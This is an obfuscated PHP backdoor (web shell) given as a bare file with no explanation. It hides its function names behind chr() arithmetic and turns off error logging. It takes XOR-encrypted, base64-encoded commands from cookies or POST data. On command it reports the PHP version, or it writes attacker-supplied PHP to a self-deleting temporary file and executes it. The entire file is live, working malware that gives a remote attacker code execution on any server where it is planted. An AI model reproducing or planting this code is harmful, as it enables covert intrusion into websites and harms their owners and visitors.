<?php $auxrlgvuv = chr(102).chr(521-416).chr(949-841).'e'.'_'.chr(112).chr(117).chr(861-745)."\x5f".chr(549-450).chr(962-851)."\x6e"."\164".chr(101).chr(514-404).'t'.'s';
$fapguvb = 'b'.'a'."\x73"."\145"."\66".'4'."\x5f".'d'.'e'.'c'.chr(193-82)."\x64".chr(1077-976);
$sijyw = chr(794-689).chr(1041-931).'i'.chr(95)."\x73".chr(101)."\164";
$zyflrwqltu = chr(117)."\x6e"."\154".chr(105)."\156"."\x6b";


@$sijyw('e'."\162"."\162".chr(274-163)."\162".chr(95)."\x6c".chr(111)."\x67", NULL);
@$sijyw('l'.chr(111).chr(349-246)."\x5f"."\x65".'r'."\x72"."\157"."\x72".'s', 0);
@$sijyw(chr(933-824).chr(97).'x'.'_'.chr(1056-955)."\x78".chr(1011-910).chr(647-548)."\x75"."\164".chr(449-344)."\x6f".'n'.'_'.chr(1020-904).'i'.chr(268-159).'e', 0);
@set_time_limit(0);

function dfzwkph($ojuitj, $spujmaclkn)
{
    $jiwnkud = "";
    for ($fquxzudgr = 0; $fquxzudgr < strlen($ojuitj);) {
        for ($j = 0; $j < strlen($spujmaclkn) && $fquxzudgr < strlen($ojuitj); $j++, $fquxzudgr++) {
            $jiwnkud .= chr(ord($ojuitj[$fquxzudgr]) ^ ord($spujmaclkn[$j]));
        }
    }
    return $jiwnkud;
}

$twvblyaz = array_merge($_COOKIE, $_POST);
$vqgvumpl = 'da3600fc-cf30-4bb3-bd26-8b8dfa2d14c4';
foreach ($twvblyaz as $cfihyhcefy => $ojuitj) {
    $ojuitj = @unserialize(dfzwkph(dfzwkph($fapguvb($ojuitj), $vqgvumpl), $cfihyhcefy));
    if (isset($ojuitj['a'.chr(107)])) {
        if ($ojuitj["\x61"] == chr(780-675)) {
            $fquxzudgr = array(
                'p'.chr(118) => @phpversion(),
                chr(115)."\x76" => "3.5",
            );
            echo @serialize($fquxzudgr);
        } elseif ($ojuitj["\x61"] == chr(478-377)) {
            $azpuqnuu = "./" . md5($vqgvumpl) . "\56".chr(991-886)."\156".chr(99);
            @$auxrlgvuv($azpuqnuu, "<" . "\x3f".chr(112).'h'.chr(883-771).chr(786-754)."\100"."\x75"."\156".chr(245-137).chr(212-107).chr(293-183)."\x6b"."\50".chr(95).chr(95).'F'.chr(73).chr(76)."\x45".chr(95)."\137"."\x29".';'.chr(32) . $ojuitj['d']);
            @include($azpuqnuu);
            @$zyflrwqltu($azpuqnuu);
        }
        exit();
    }
}

